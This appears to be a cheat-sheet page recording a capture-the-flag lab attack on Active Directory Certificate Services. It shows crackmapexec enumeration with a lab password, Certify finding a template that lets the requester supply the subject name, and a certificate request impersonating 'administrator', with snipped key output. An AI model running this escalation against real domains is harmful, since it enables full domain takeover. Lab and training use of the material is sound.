# AD CS

<pre class="language-bash"><code class="lang-bash">AD CS enum
oxdf@hacky$ crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.202    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
ADCS                                                Found CN: sequel-DC-CA

*Evil-WinRM* PS C:\programdata> upload Certify.exe

*Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable /currentuser
...[snip]...
[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT 
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
                                      
 *Evil-WinRM* PS C:\programdata> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
<strong>[*] Action: Request a Certificates
</strong>
[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAo56P0pa6nWXkj3HrM2V1c3K6V8YIsDZmPIArLsqA4M9j+iey
da4m1KrKO/aVGCJ+DISe0nl6q/7OuaQd2zyjgJJXXFqzC8/JJGqJe810LSoAyDHX
...[snip]...
dOlhVtGXsvdK//0SELfhlVAX0jzBiUhNbifCDmoakNpfGouSuNxglg==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAqifcP7M+EvDgAAAAAACjANBgkqhkiG9w0BAQsF
...[snip]...
+Aa1fv7lFabU7ksILNBuyVhfssYDSA==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:14.0570539



</code></pre>
